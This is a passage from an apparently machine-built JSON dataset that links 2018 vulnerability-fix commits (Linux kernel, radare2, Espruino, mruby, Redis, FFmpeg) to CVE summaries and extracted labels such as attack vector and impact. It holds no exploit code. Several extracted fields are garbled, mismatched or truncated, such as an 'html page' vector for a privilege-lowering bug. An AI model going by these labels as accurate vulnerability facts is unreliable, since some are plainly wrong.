INT_MAX. INT_MAX is an indicator for user space that the\noverrun value has been clamped.\n\nReported-by: Team OWL337 <icytxw@gmail.com>\nSigned-off-by: Thomas Gleixner <tglx@linutronix.de>\nAcked-by: John Stultz <john.stultz@linaro.org>\nCc: Peter Zijlstra <peterz@infradead.org>\nCc: Michael Kerrisk <mtk.manpages@gmail.com>\nLink: https:\/\/lkml.kernel.org\/r\/20180626132705.018623573@linutronix.de","summary":"An issue was discovered in the Linux kernel through 4.17.3. An Integer Overflow in kernel\/time\/posix-timers.c in the POSIX timer code is caused by the way the overrun accounting works. Depending on interval and expiry time values, the overrun can be larger than INT_MAX, but the accounting is int based. This basically makes the accounting values, which are visible to user space via timer_getoverrun(2) and siginfo::si_overrun, random. For example, a local user can cause a denial of service (signed integer overflow) via crafted mmap, futex, timer_create, and timer_settime system calls.","commit_message_1":"sanitize overrun handling the posix timer overrun handling is broken because the forwarding function can return a huge number of overrun which doe not fit in an int","Vulnerability Type":"integer overflow","Attack Vector":"By using a specially-crafted system call","Impact":"cause a denial of service","Root Cause":"caused by an integer overflow","Attack Type":"local attacker"},{"commit_id":"81f9c4e4177d31ced6f52a89bb70e93bfb77ca03","cve_id":"CVE-2018-12714","cwe_id":"CWE-787","commit_message":"Merge tag 'trace-v4.18-rc1' of git:\/\/git.kernel.org\/pub\/scm\/linux\/kernel\/git\/rostedt\/linux-trace\n\nPull tracing fixes from Steven Rostedt:\n \"This contains a few fixes and a clean up.\n\n   - a bad merge caused an \"endif\" to go in the wrong place in\n     scripts\/Makefile.build\n\n   - softirq tracing fix for tracing that corrupts lockdep and causes a\n     false splat\n\n   - histogram documentation typo fixes\n\n   - fix a bad memory reference when passing in no filter to the filter\n     code\n\n   - simplify code by using the swap macro instead of open coding the\n     swap\"\n\n* tag 'trace-v4.18-rc1' of git:\/\/git.kernel.org\/pub\/scm\/linux\/kernel\/git\/rostedt\/linux-trace:\n  tracing: Fix SKIP_STACK_VALIDATION=1 build due to bad merge with -mrecord-mcount\n  tracing: Fix some errors in histogram documentation\n  tracing: Use swap macro in update_max_tr\n  softirq: Reorder trace_softirqs_on to prevent lockdep splat\n  tracing: Check for no filter when processing event filters","summary":"An issue was discovered in the Linux kernel through 4.17.2. The filter parsing in kernel\/trace\/trace_events_filter.c could be called with no filter, which is an N=0 case when it expected at least one line to have been read, thus making the N-1 index invalid. This allows attackers to cause a denial of service (slab out-of-bounds write) or possibly have unspecified other impact via crafted perf_event_open and mmap system calls.","commit_message_1":"pull tracing fix from steven rostedt : `` this contains a few fix and a clean up","Vulnerability Type":"Out-of-bounds Write","Attack Vector":"impact via crafted perf _ event _ open and mmap system calls","Impact":"cause a denial of service ( slab out - of - bounds write ) or possibly have unspecified other","Root Cause":"caused by an out-of-bounds write","Attack Type":"local attacker"},{"commit_id":"8fd069f6dedb064339f1091069ac96f3f8bdb552","cve_id":"CVE-2018-12684","cwe_id":"CWE-125","commit_message":"Check length of memcmp","summary":"Out-of-bounds Read in the send_ssi_file function in civetweb.c in CivetWeb through 1.10 allows attackers to cause a Denial of Service or Information Disclosure via a crafted SSI file.","commit_message_1":"check length of memcmp","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted ssi file","Impact":"cause a denial of service or information disclosure","Root Cause":"caused by an out-of-bounds read","Attack Type":"remote attacker"},{"commit_id":"bd23a7269834dc7c1f93e83535d16ebc44b75eba","cve_id":"CVE-2018-12633","cwe_id":"CWE-362","commit_message":"virt: vbox: Only copy_from_user the request-header once\n\nIn vbg_misc_device_ioctl(), the header of the ioctl argument is copied from\nthe userspace pointer 'arg' and saved to the kernel object 'hdr'. Then the\n'version', 'size_in', and 'size_out' fields of 'hdr' are verified.\n\nBefore this commit, after the checks a buffer for the entire request would\nbe allocated and then all data including the verified header would be\ncopied from the userspace 'arg' pointer again.\n\nGiven that the 'arg' pointer resides in userspace, a malicious userspace\nprocess can race to change the data pointed to by 'arg' between the two\ncopies. By doing so, the user can bypass the verifications on the ioctl\nargument.\n\nThis commit fixes this by using the already checked copy of the header\nto fill the header part of the allocated buffer and only copying the\nremainder of the data from userspace.\n\nSigned-off-by: Wenwen Wang <wang6495@umn.edu>\nReviewed-by: Hans de Goede <hdegoede@redhat.com>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>","summary":"An issue was discovered in the Linux kernel through 4.17.2. vbg_misc_device_ioctl() in drivers\/virt\/vboxguest\/vboxguest_linux.c reads the same user data twice with copy_from_user. The header part of the user data is double-fetched, and a malicious user thread can tamper with the critical variables (hdr.size_in and hdr.size_out) in the header between the two fetches because of a race condition, leading to severe kernel errors, such as buffer over-accesses. This bug can cause a local denial of service and information leakage.","commit_message_1":"vbox : only copy_from_user the request-header once in vbg_misc_device_ioctl ( ) , the header of the ioctl argument is copied from the userspace pointer 'arg ' and saved to the kernel object 'hdr '","Vulnerability Type":"Race Condition","Attack Vector":"By sending a specially-crafted argument","Impact":"cause a denial of service condition and obtain sensitive information","Root Cause":"caused by a race condition","Attack Type":"local attacker"},{"commit_id":"4e97fdb86d0a0141ec9a052c6e691fcd07bb45c8","cve_id":"CVE-2018-12615","cwe_id":"CWE-732","commit_message":"ExecHelperMain: fix privilege lowering code","summary":"An issue was discovered in switchGroup() in agent\/ExecHelper\/ExecHelperMain.cpp in Phusion Passenger before 5.3.2. The set of groups (gidset) is not set correctly, leaving it up to randomness (i.e., uninitialized memory) which supplementary groups are actually being set while lowering privileges.","commit_message_1":"exechelpermain : fix privilege lowering code","Vulnerability Type":"Incorrect Permission Assignment for Critical Resource","Attack Vector":"via a crafted html page","Impact":"bypass security restrictions","Root Cause":"caused by the failure to set the set of groups (gidset) correctly by switchGroup()","Attack Type":"attacker"},{"commit_id":"b3332a182f8ba33a34542e4a0370f38b914ccf7d","cve_id":"CVE-2018-12460","cwe_id":"CWE-476","commit_message":"avcodec\/idctdsp: Transmit studio_profile to init instead of using AVCodecContext profile\n\nThese 2 fields are not always the same, it is simpler to always use the same field\nfor detecting studio profile\n\nFixes: null pointer dereference\nFixes: ffmpeg_crash_3.avi\n\nFound-by: Thuan Pham <thuanpv@comp.nus.edu.sg>, Marcel B\u00f6hme, Andrew Santosa and Alexandru RazvanCaciulescu with AFLSmart\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>","summary":"libavcodec in FFmpeg 4.0 may trigger a NULL pointer dereference if the studio profile is incorrectly detected while converting a crafted AVI file to MPEG4, leading to a denial of service, related to idctdsp.c and mpegvideo.c.","commit_message_1":"transmit studio_profile to init instead of using avcodeccontext profile these <number> field are not always the same , it is simpler to always use the same field for detecting studio profile","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by a NULL pointer dereference","Attack Type":"remote attacker"},{"commit_id":"2fc108f60f98cd00813418a8754a46476b404a3c","cve_id":"CVE-2018-12459","cwe_id":"CWE-20","commit_message":"avcodec\/mpeg4videodec: Clear bits_per_raw_sample if it has originated from a previous instance\n\nFixes: assertion failure\nFixes: ffmpeg_crash_5.avi\n\nFound-by: Thuan Pham <thuanpv@comp.nus.edu.sg>, Marcel B\u00f6hme, Andrew Santosa and Alexandru Razvan Caciulescu with AFLSmart\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>","summary":"An inconsistent bits-per-sample value in the ff_mpeg4_decode_picture_header function in libavcodec\/mpeg4videodec.c in FFmpeg 4.0 may trigger an assertion violation while converting a crafted AVI file to MPEG4, leading to a denial of service.","commit_message_1":"clear bits_per_raw_sample if it ha originated from a previous instance","Vulnerability Type":"Improper Input Validation","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by an inconsistent bits-per-sample value issue","Attack Type":"remote attacker"},{"commit_id":"c04082cf138f1f51cedf05ee9ad36fb6763cafc6","cve_id":"CVE-2018-12453","cwe_id":"CWE-704","commit_message":"Abort in XGROUP if the key is not a stream","summary":"Type confusion in the xgroupCommand function in t_stream.c in redis-server in Redis before 5.0 allows remote attackers to cause denial-of-service via an XGROUP command in which the key is not a stream.","commit_message_1":"abort in xgroup if the key is not a stream","Vulnerability Type":"Incorrect Type Conversion or Cast","Attack Vector":"via an xgroup command in which the key is not a stream","Impact":"cause a denial of service","Root Cause":"caused by a type confusion","Attack Type":"remote attacker"},{"commit_id":"9b9568d500f31f964af26ba8d01e542e1f27e5ca","cve_id":"CVE-2018-12436","cwe_id":"CWE-200","commit_message":"Change ECDSA signing to use blinding.","summary":"wolfcrypt\/src\/ecc.c in wolfSSL before 3.15.1.patch allows a memory-cache side-channel attack on ECDSA signatures, aka the Return Of the Hidden Number Problem or ROHNP. To discover an ECDSA key, the attacker needs access to either the local machine or a different virtual machine on the same physical host.","commit_message_1":"change ecdsa signing to use blinding","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"aka the Return Of the Hidden Number Problem or ROHNP","Impact":"obtain sensitive information","Root Cause":"caused by a memory-cache side-channel attack on DSA and ECDSA signatures","Attack Type":"local attacker"},{"commit_id":"48fc8df51d99f9d8ba251219367b3d629cc848e3","cve_id":"CVE-2018-12435","cwe_id":"CWE-200","commit_message":"Address DSA\/ECDSA side channel","summary":"Botan 2.5.0 through 2.6.0 before 2.7.0 allows a memory-cache side-channel attack on ECDSA signatures, aka the Return Of the Hidden Number Problem or ROHNP, related to dsa\/dsa.cpp, ec_group\/ec_group.cpp, and ecdsa\/ecdsa.cpp. To discover an ECDSA key, the attacker needs access to either the local machine or a different virtual machine on the same physical host.","commit_message_1":"address dsa\/ecdsa side channel","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"aka the Return Of the Hidden Number Problem or ROHNP","Impact":"obtain sensitive information","Root Cause":"caused by a memory-cache side-channel attack on DSA and ECDSA signatures","Attack Type":"local attacker"},{"commit_id":"9fdcc15962f9ff4baebe6fdd947816f43f730d50","cve_id":"CVE-2018-12326","cwe_id":"CWE-119","commit_message":"Security: fix redis-cli buffer overflow.\n\nThanks to Fakhri Zulkifli for reporting it.\n\nThe fix switched to dynamic allocation, copying the final prompt in the\nstatic buffer only at the end.","summary":"Buffer overflow in redis-cli of Redis before 4.0.10 and 5.x before 5.0 RC3 allows an attacker to achieve code execution and escalate to higher privileges via a crafted command line. NOTE: It is unclear whether there are any common situations in which redis-cli is used with, for example, a -h (aka hostname) argument from an untrusted source.","commit_message_1":"fix redis-cli buffer overflow","Vulnerability Type":"buffer overflow","Attack Vector":"By sending a specially-crafted argument","Impact":"achieve code execution and escalate to higher privileges","Root Cause":"caused by improper bounds checking by the hostname","Attack Type":"local attacker"},{"commit_id":"bbb4af56003c1afdad67af0c4339267ca38b1017","cve_id":"CVE-2018-12322","cwe_id":"CWE-125","commit_message":"Fix #10294 - crash in r2_hoobr__6502_op","summary":"There is a heap out of bounds read in radare2 2.6.0 in _6502_op() in libr\/anal\/p\/anal_6502.c via a crafted iNES ROM binary file.","commit_message_1":"fix # <number> - crash in r2_hoobr__6502_op","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By persuading a victim to open a specially crafted iNES ROM binary file","Impact":"overflow a buffer and execute arbitrary code","Root Cause":"caused by improper bounds checking by the _6502_op() function","Attack Type":"remote attacker"},{"commit_id":"224e6bc13fa353dd3b7f7a2334588f1c4229e58d","cve_id":"CVE-2018-12321","cwe_id":"CWE-125","commit_message":"Fix #10296 - Heap out of bounds read in java_switch_op()","summary":"There is a heap out of bounds read in radare2 2.6.0 in java_switch_op() in libr\/anal\/p\/anal_java.c via a crafted Java binary file.","commit_message_1":"fix # <number> - heap out of bound read in java_switch_op ( )","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By persuading a victim to open a specially crafted Java binary file","Impact":"overflow a buffer and execute arbitrary code","Root Cause":"caused by improper bounds checking by the java_switch_op() function","Attack Type":"remote attacker"},{"commit_id":"90b71c017a7fa9732fe45fd21b245ee051b1f548","cve_id":"CVE-2018-12320","cwe_id":"CWE-416","commit_message":"Fix #10293 - Use-after-free in r_anal_bb_free()","summary":"There is a use after free in radare2 2.6.0 in r_anal_bb_free() in libr\/anal\/bb.c via a crafted Java binary file.","commit_message_1":"fix # <number> - use-after-free in r_anal_bb_free ( )","Vulnerability Type":"Use After Free","Attack Vector":"By persuading a victim to open a specially crafted Java binary file","Impact":"cause a denial of service","Root Cause":"caused by a use after free","Attack Type":"remote attacker"},{"commit_id":"faa4eaf6803bd11669bc324b4c34e7162286bfa3","cve_id":"CVE-2018-12249","cwe_id":"CWE-476","commit_message":"`mrb_class_real()` did not work for `BasicObject`; fix #4037","summary":"An issue was discovered in mruby 1.4.1. There is a NULL pointer dereference in mrb_class_real because *class BasicObject* is not properly supported in class.c.","commit_message_1":"` mrb_class_real ( ) ` did not work for ` basicobject ` ; fix # <number>","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"a NULL pointer dereference in mrb_class_real","Impact":"cause a denial of service","Root Cause":"caused by a NULL pointer dereference","Attack Type":"local attacker"},{"commit_id":"778500563a9f7ceba996937dc886bd8cde29b42b","cve_id":"CVE-2018-12248","cwe_id":"CWE-125","commit_message":"Extend stack when pushing arguments that does not fit in; fix #4038","summary":"An issue was discovered in mruby 1.4.1. There is a heap-based buffer over-read associated with OP_ENTER because mrbgems\/mruby-fiber\/src\/fiber.c does not extend the stack in cases of many arguments to fiber.","commit_message_1":"extend stack when pushing argument that doe not fit in ; fix # <number>","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"mrbgems\/mruby-fiber\/src\/fiber.c does not extend the stack in cases of many arguments to fiber","Impact":"cause a denial of service","Root Cause":"caused by a heap-based buffer over-read","Attack Type":"local attacker"},{"commit_id":"55edae0226409de25e59922807cb09acb45731a2","cve_id":"CVE-2018-12247","cwe_id":"CWE-476","commit_message":"Allow `Object#clone` to copy frozen status only; fix #4036\n\nCopying all flags from the original object may overwrite the clone's\nflags e.g. the embedded flag.","summary":"An issue was discovered in mruby 1.4.1. There is a NULL pointer dereference in mrb_class, related to certain .clone usage, because mrb_obj_clone in kernel.c copies flags other than the MRB_FLAG_IS_FROZEN flag (e.g., the embedded flag).","commit_message_1":"allow ` object # clone ` to copy frozen status only ; fix # <number> copying all flag from the original object may overwrite the clone's flag <file>","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"a NULL pointer dereference in mrb_class_real","Impact":"cause a denial of service","Root Cause":"caused by a NULL pointer dereference","Attack Type":"local attacker"},{"commit_id":"6d8c50dcb029872b298eea68cc6209c866fd3e14","cve_id":"CVE-2018-12232","cwe_id":"CWE-362","commit_message":"socket: close race condition between sock_close() and sockfs_setattr()\n\nfchownat() doesn't even hold refcnt of fd until it figures out\nfd is really needed (otherwise is ignored) and releases it after\nit resolves the path. This means sock_close() could race with\nsockfs_setattr(), which leads to a NULL pointer dereference\nsince typically we set sock->sk to NULL in ->release().\n\nAs pointed out by Al, this is unique to sockfs. So we can fix this\nin socket layer by acquiring inode_lock in sock_close() and\nchecking against NULL in sockfs_setattr().\n\nsock_release() is called in many places, only the sock_close()\npath matters here. And fortunately, this should not affect normal\nsock_close() as it is only called when the last fd refcnt is gone.\nIt only affects sock_close() with a parallel sockfs_setattr() in\nprogress, which is not common.\n\nFixes: 86741ec25462 (\"net: core: Add a UID field to struct sock.\")\nReported-by: shankarapailoor <shankarapailoor@gmail.com>\nCc: Tetsuo Handa <penguin-kernel@i-love.sakura.ne.jp>\nCc: Lorenzo Colitti <lorenzo@google.com>\nCc: Al Viro <viro@zeniv.linux.org.uk>\nSigned-off-by: Cong Wang <xiyou.wangcong@gmail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"In net\/socket.c in the Linux kernel through 4.17.1, there is a race condition between fchownat and close in cases where they target the same socket file descriptor, related to the sock_close and sockfs_setattr functions. fchownat does not increment the file descriptor reference count, which allows close to set the socket to NULL during fchownat's execution, leading to a NULL pointer dereference and system crash.","commit_message_1":"close race condition between sock_close ( ) and sockfs_setattr ( ) fchownat ( ) doe n't even hold refcnt of fd until it figure out fd is really needed ( otherwise is ignored ) and release it after it resolve the path","Vulnerability Type":"Race Condition","Attack Vector":"fchownat does not increment the file descriptor reference count","Impact":"cause a denial of service","Root Cause":"caused by a NULL pointer dereference","Attack Type":"local attacker"},{"commit_id":"b64ce17852b180dfeea81cf458660be41a78974d","cve_id":"CVE-2018-11743","cwe_id":"CWE-824","commit_message":"Should not call `initialize_copy` for `TT_ICLASS`; fix #4027\n\nSince `TT_ICLASS` is a internal object that should never be revealed\nto Ruby world.","summary":"The init_copy function in kernel.c in mruby 1.4.1 makes initialize_copy calls for TT_ICLASS objects, which allows attackers to cause a denial of service (mrb_hash_keys uninitialized pointer and application crash) or possibly have unspecified other impact.","commit_message_1":"should not call ` initialize_copy ` for ` tt_iclass ` ; fix # <number> since ` tt_iclass ` is a internal object that should never be revealed to ruby world","Vulnerability Type":"Access of Uninitialized Pointer","Attack Vector":"By sending a specially-crafted argument","Impact":"cause a denial of service","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"bf4416ab9129ee3afd56739ea4e3cd0da5484b6b","cve_id":"CVE-2018-11598","cwe_id":"CWE-125","commit_message":"Fix bug if using an undefined member of an object for for..in (fix #1437)","summary":"Espruino before 1.99 allows attackers to cause a denial of service (application crash) and a potential Information Disclosure with user crafted input files via a Buffer Overflow or Out-of-bounds Read during syntax parsing of certain for loops in jsparse.c.","commit_message_1":"fix bug if using an undefined member of an object for for","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a buffer overflow or out - of - bounds read during syntax parsing of certain for loops in jsparse . c","Impact":"cause a denial of service ( application crash ) and a potential information disclosure with user crafted input files","Root Cause":"caused by a heap-based buffer overflow during syntax parsing","Attack Type":"remote attacker"},{"commit_id":"51380baf17241728b6d48cdb84140b931e3e3cc5","cve_id":"CVE-2018-11597","cwe_id":"CWE-674","commit_message":"Fix stack overflow if interpreting a file full of '{' (fix #1448)","summary":"Espruino before 1.99 allows attackers to cause a denial of service (application crash) with a user crafted input file via a Buffer Overflow during syntax parsing because of a missing check for stack exhaustion with many '{' characters in jsparse.c.","commit_message_1":"fix stack overflow if interpreting a file full of ' { ' ( fix # <number> )","Vulnerability Type":"Uncontrolled Recursion","Attack Vector":"via a buffer overflow during syntax parsing ","Impact":"cause a denial of service","Root Cause":"caused by a stack-based buffer overflow during syntax parsing","Attack Type":"remote attacker"},{"commit_id":"ce1924193862d58cb43d3d4d9dada710a8361b89","cve_id":"CVE-2018-11596","cwe_id":"CWE-119","commit_message":"fix jsvGetString regression","summary":"Espruino before 1.99 allows attackers to cause a denial of service (application crash) with a user crafted input file via a Buffer Overflow during syntax parsing because a check for '0' is made for the wrong array element in jsvar.c.","commit_message_1":"fix jsvgetstring regression","Vulnerability Type":"buffer overflow","Attack Vector":"via a buffer overflow during syntax parsing because a check for ' 0 ' is made for the wrong array element in jsvar . c ","Impact":"cause a denial of service","Root Cause":"caused by a stack-based buffer overflow during syntax parsing","Attack Type":"remote attacker"},{"commit_id":"0a7619875bf79877907205f6bee08465b89ff10b","cve_id":"CVE-2018-11595","cwe_id":"CWE-119","commit_message":"Fix strncat\/cpy bounding issues (fix #1425)","summary":"Espruino before 1.99 allows attackers to cause a denial of service (application crash) and a potential Escalation of Privileges with a user crafted input file via a Buffer Overflow during syntax parsing, because strncat is misused.","commit_message_1":"fix strncat\/cpy bounding issue ( fix # <number> )","Vulnerability Type":"buffer overflow","Attack Vector":"via a buffer overflow during syntax parsing , because strncat is misused ","Impact":"cause a denial of service","Root Cause":"caused by a stack-based buffer overflow during syntax parsing","Attack Type":"remote attacker"},{"commit_id":"c36d30529118aa049797db43f111ddad468aad29","cve_id":"CVE-2018-11594","cwe_id":"CWE-119","commit_message":"Fix stack overflow if void void void... is repeated many times (fix #1434)","summary":"Espruino before 1.99 allows attackers to cause a denial of service (application crash) with a user crafted input file via a Buffer Overflow during syntax parsing of *VOID* tokens in jsparse.c.","commit_message_1":"fix stack overflow if void void void","Vulnerability Type":"buffer overflow","Attack Vector":"via a buffer overflow during syntax parsing of * void * tokens in jsparse . c","Impact":"cause a denial of service","Root Cause":"caused by a stack-based buffer overflow during syntax parsing","Attack Type":"remote attacker"},{"commit_id":"bed844f109b6c222816740555068de2e101e8018","cve_id":"CVE-2018-11593","cwe_id":"CWE-787","commit_message":"remove strncpy usage as it's effectively useless, replace with an assertion since fn is only used internally (fix #1426)","summary":"Espruino before 1.99 allows attackers to cause a denial of service (application crash) and potential Information Disclosure with a user crafted input file via a Buffer Overflow during syntax parsing because strncpy is misused in jslex.c.","commit_message_1":"remove strncpy usage a it 's effectively useless , replace with an assertion since fn is only used internally ( fix # <number> )","Vulnerability Type":"Out-of-bounds Write","Attack Vector":"via a buffer overflow during syntax parsing because strncpy is misused in jslex . c","Impact":"cause a denial of service","Root Cause":"caused by a stack-based buffer overflow during syntax parsing","Attack Type":"remote attacker"},{"commit_id":"8a44b04b584b3d3ab1cb68fed410f7ecb165e50e","cve_id":"CVE-2018-11592","cwe_id":"CWE-125","commit_message":"Add height check for Graphics.createArrayBuffer(...vertical_byte:true) (fix #1421)","summary":"Espruino before 1.98 allows attackers to cause a denial of service (application crash) with a user crafted input file via an Out-of-bounds Read during syntax parsing in which certain height validation is missing in libs\/graphics\/jswrap_graphics.c.","commit_message_1":"add height check for <file> (","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via an out - of - bounds read during syntax parsing in which certain height validation is missing in libs \/ graphics \/ jswrap _ graphics . c","Impact":"cause a denial of service ( application crash ) with a user crafted input file","Root Cause":"caused by an out-of-bounds read during syntax parsing","Attack Type":"remote attacker"},{"commit_id":"a0d7f432abee692402c00e8b615ff5982dde9780","cve_id":"CVE-2018-11590","cwe_id":"CWE-190","commit_message":"Fix stack size detection on Linux (fix #1427)","summary":"Espruino before 1.99 allows attackers to cause a denial of service (application crash) with a user crafted input file via an integer overflow during syntax parsing. This was addressed by fixing stack size detection on Linux in jsutils.c.","commit_message_1":"fix stack size detection on linux ( fix # <number> )","Vulnerability Type":"integer overflow","Attack Vector":"via an integer overflow during syntax parsing","Impact":"cause a denial of service ( application crash ) with a user crafted input file","Root Cause":"caused by an integer overflow during syntax parsing","Attack Type":"remote attacker"},{"commit_id":"0a0b98734479aa5b3c671d5190e86273372cab95","cve_id":"CVE-2018-11508","cwe_id":"CWE-200","commit_message":"compat: fix 4-byte infoleak via uninitialized struct field\n\nCommit 3a4d44b61625 (\"ntp: Move adjtimex related compat syscalls to\nnative counterparts\") removed the memset() in compat_get_timex().  Since\nthen, the compat adjtimex syscall can invoke do_adjtimex() with an\nuninitialized ->tai.\n\nIf do_adjtimex() doesn't write to ->tai (e.g.  because the arguments are\ninvalid), compat_put_timex() then copies the uninitialized ->tai field\nto userspace.\n\nFix it by adding the memset() back.\n\nFixes: 3a4d44b61625 (\"ntp: Move adjtimex related compat syscalls to native counterparts\")\nSigned-off-by: Jann Horn <jannh@google.com>\nAcked-by: Kees Cook <keescook@chromium.org>\nAcked-by: Al Viro <viro@zeniv.linux.org.uk>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The compat_get_timex function in kernel\/compat.c in the Linux kernel before 4.16.9 allows local users to obtain sensitive information from kernel memory via adjtimex.","commit_message_1":"fix <number>-byte infoleak via uninitialized struct field commit 3a4d44b61625 ( `` ntp : move adjtimex related compat syscalls to native counterpart '' ) removed the memset ( ) in compat_get_timex ( )","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via adjtimex","Impact":"obtain sensitive information from kernel memory","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"f7068114d45ec55996b9040e98111afa56e010fe","cve_id":"CVE-2018-11506","cwe_id":"CWE-119","commit_message":"sr: pass down correctly sized SCSI sense buffer\n\nWe're casting the CDROM layer request_sense to the SCSI sense\nbuffer, but the former is 64 bytes and the latter is 96 bytes.\nAs we generally allocate these on the stack, we end up blowing\nup the stack.\n\nFix this by wrapping the scsi_execute() call with a properly\nsized sense buffer, and copying back the bits for the CDROM\nlayer.\n\nCc: stable@vger.kernel.org\nReported-by: Piotr Gabriel Kosinski <pg.kosinski@gmail.com>\nReported-by: Daniel Shapira <daniel@twistlock.com>\nTested-by: Kees Cook <keescook@chromium.org>\nFixes: 82ed4db499b8 (\"block: split scsi_request out of struct request\")\nSigned-off-by: Jens Axboe <axboe@kernel.dk>","summary":"The sr_do_ioctl function in drivers\/scsi\/sr_ioctl.c in the Linux kernel through 4.16.12 allows local users to cause a denial of service (stack-based buffer overflow) or possibly have unspecified other impact because sense buffers have different sizes at the CDROM layer and the SCSI layer, as demonstrated by a CDROMREADMODE2 ioctl call.","commit_message_1":"pas down correctly sized scsi sense buffer we 're casting the cdrom layer request_sense to the scsi sense buffer , but the former is <number> byte and the latter is <number> byte","Vulnerability Type":"buffer overflow","Attack Vector":"as demonstrated by a CDROMREADMODE2 ioctl call","Impact":"cause a denial of service ( stack - based buffer overflow ) or possibly have unspecified other impact because sense buffers have different sizes at the cdrom layer and the scsi layer , as demonstrated by a cdromreadmode2 ioctl call","Root Cause":"caused by stack-based buffer overflow","Attack Type":"local attacker"},{"commit_id":"77c47cf873dd55b396da60baa2ca83bbd39e4add","cve_id":"CVE-2018-11384","cwe_id":"CWE-125","commit_message":"Fix #9903 - oobread in RAnal.sh","summary":"The sh_op() function in radare2 2.5.0 allows remote attackers to cause a denial of service (heap-based out-of-bounds read and application crash) via a crafted ELF file.","commit_message_1":"fix # <number> - oobread in <file>","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted elf file","Impact":"cause a denial of service ( heap - based out - of - bounds read and application crash )","Root Cause":"caused by a heap-based out-of-bounds read","Attack Type":"remote attacker"},{"commit_id":"9d348bcc2c4bbd3805e7eec97b594be9febbdf9a","cve_id":"CVE-2018-11383","cwe_id":"CWE-416","commit_message":"Fix #9943 - Invalid free on RAnal.avr","summary":"The r_strbuf_fini() function in radare2 2.5.0 allows remote attackers to cause a denial of service (invalid free and application crash) via a crafted ELF file because of an uninitialized variable in the CPSE handler in libr\/anal\/p\/anal_avr.c.","commit_message_1":"fix # <number> - invalid free on <file>","Vulnerability Type":"Use After Free","Attack Vector":"via a crafted elf file because of an uninitialized variable in the cpse handler in libr \/ anal \/ p \/ anal _ avr . c","Impact":"cause a denial of service ( invalid free and application crash )","Root Cause":"caused by an invalid free","Attack Type":"remote attacker"},{"commit_id":"d04c78773f6959bcb427453f8e5b9824d5ba9eff","cve_id":"CVE-2018-11382","cwe_id":"CWE-125","commit_message":"Fix #10091 - crash in AVR analysis","summary":"The _inst__sts() function in radare2 2.5.0 allows remote attackers to cause a denial of service (heap-based out-of-bounds read and application crash) via a crafted binary file.","commit_message_1":"fix # <number> - crash in avr analysis","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted binary file","Impact":"cause a denial of service ( heap - based out - of - bounds read and application crash )","Root Cause":"caused by a heap-based out-of-bounds read","Attack Type":"remote attacker"},{"commit_id":"3fcf41ed96ffa25b38029449520c8d0a198745f3","cve_id":"CVE-2018-11381","cwe_id":"CWE-125","commit_message":"Fix #9902 - Fix oobread in RBin.string_scan_range","summary":"The string_scan_range() function in radare2 2.5.0 allows remote attackers to cause a denial of service (heap-based out-of-bounds read and application crash) via a crafted binary file.","commit_message_1":"fix # <number> - fix oobread in <file>","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted binary file","Impact":"cause a denial of service ( heap - based out - of - bounds read and application crash )","Root Cause":"caused by a heap-based out-of-bounds read","Attack Type":"remote attacker"},{"commit_id":"60208765887f5f008b3b9a883f3addc8bdb9c134","cve_id":"CVE-2018-11380","cwe_id":"CWE-125","commit_message":"Fix #9970 - heap oobread in mach0 parser (#10026)","summary":"The parse_import_ptr() function in radare2 2.5.0 allows remote attackers to cause a denial of service (heap-based out-of-bounds read and application crash) via a crafted Mach-O file.","commit_message_1":"fix # <number> - heap oobread in mach0 parser ( # <number> )","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted mach - o file","Impact":"cause a denial of service ( heap - based out - of - bounds read and application crash )","Root Cause":"caused by a heap-based out-of-bounds read","Attack Type":"remote attacker"},{"commit_id":"4e1cf0d3e6f6fe2552a269def0af1cd2403e266c","cve_id":"CVE-2018-11379","cwe_id":"CWE-125","commit_message":"Fix crash in pe","summary":"The get_debug_info() function in radare2 2.5.0 allows remote attackers to cause a denial of service (heap-based out-of-bounds read and application crash) via a crafted PE file.","commit_message_1":"fix crash in pe","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted pe file","Impact":"cause a denial of service ( heap - based out - of - bounds read and application crash )","Root Cause":"caused by a heap-based out-of-bounds read","Attack Type":"remote attacker"},{"commit_id":"bd276ef2fd8ac3401e65be7c126a43175ccfbcd7","cve_id":"CVE-2018-11378","cwe_id":"CWE-119","commit_message":"Fix #9969 - Stack overflow in wasm disassembler","summary":"The wasm_dis() function in libr\/asm\/arch\/wasm\/wasm.c in or possibly have unspecified other impact via a crafted WASM file.","commit_message_1":"fix # <number> - stack overflow in wasm disassembler","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted WASM file","Impact":"has an unknown impact","Root Cause":"A stack-based buffer overflow","Attack Type":"remote attacker"},{"commit_id":"1f37c04f2a762500222dda2459e6a04646feeedf","cve_id":"CVE-2018-11376","cwe_id":"CWE-125","commit_message":"Fix #9904 - crash in r2_hoobr_r_read_le32 (over 9000 entrypoints) and read_le oobread (#9923)","summary":"The r_read_le32() function in radare2 2.5.0 allows remote attackers to cause a denial of service (heap-based out-of-bounds read and application crash) via a crafted ELF file.","commit_message_1":"fix # <number> - crash in 